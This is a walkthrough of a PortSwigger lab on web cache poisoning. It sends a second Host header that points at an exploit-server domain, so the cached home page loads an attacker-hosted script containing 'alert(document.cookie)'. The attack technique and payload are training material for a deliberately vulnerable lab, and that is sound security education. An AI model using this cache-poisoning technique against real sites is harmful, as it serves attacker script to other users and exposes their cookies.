# [Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)

> This is the **web cache poisoning lab**. The goal: poison the cache so a **victim** runs your script. The trick uses a **second Host header**.

- One Host header is validated, so you **add a second one**.
- The site **routes** using the first, but **reflects** the second into a script URL.
- That poisoned page gets **cached** and served to the victim.

## Part 1: Set up and test the Host header

**Step 1: Load the lab**

- Open the lab in Burp's browser.
- Click **Home** to refresh.

**Step 2: Grab the request**

- Go to **Proxy -> HTTP history**.
- Right-click the `GET /` request.
- Choose **Send to Repeater**.

**Step 3: Test the Host header**

- In Repeater, change the Host header.
- Notice: the home page **stops working**.
- So the server **does validate** the Host. One header alone won't work.

## Part 2: Learn the cache

**Step 4: Spot the cache + add a cache buster**

- Look at the response headers.
- They tell you two things:
- when you get a **cache hit**
- how **old** the cached copy is
- Add a fake query parameter as a **cache buster**: `GET /?qwe=asd`

> Change this number each time you want a **fresh** reply from the back-end (not the cache).

## Part 3: Find the injection point

**Step 5: Add a second Host header**

- Keep the real Host.
- Add a **second** Host header with any value.
- The site **ignores** it for routing (page still works).
- But the value **shows up** in the page, inside an absolute URL that loads `/resources/js/tracking.js`.

**Step 6: Confirm it gets cached**

- Remove the second Host header.
- Send again with the **same** cache buster.
- You still get your injected value back.

> This proves it: your injected value is now **saved in the cache**.

## Part 4: Build the payload

**Step 7: Make your script**

- Go to the exploit server.
- Create a file at: `/resources/js/tracking.js`
- Put this in the body:

```js
alert(document.cookie);
```

- **Store** it. **Copy** your exploit server domain.

## Part 5: Poison and test

**Step 8: Point the page at your script**

- Back in Repeater, add a second Host header with **your exploit domain**:

```
GET /?qwe=asd HTTP/1.1
Host: xxx.web-security-academy.net
Host: yyy.exploit-server.net
```

**Step 9: Check it works**

- Send a few times until you get a **cache hit** with your exploit URL in the response.
- Now act as the victim: load the page in the **browser** using the **same** cache buster.
- The `alert()` should **fire**.

## Part 6: Solve the lab

**Step 10: Poison for the real victim**

- In Repeater, **remove the cache buster**.
- Replay the request until the **real** cache is poisoned.
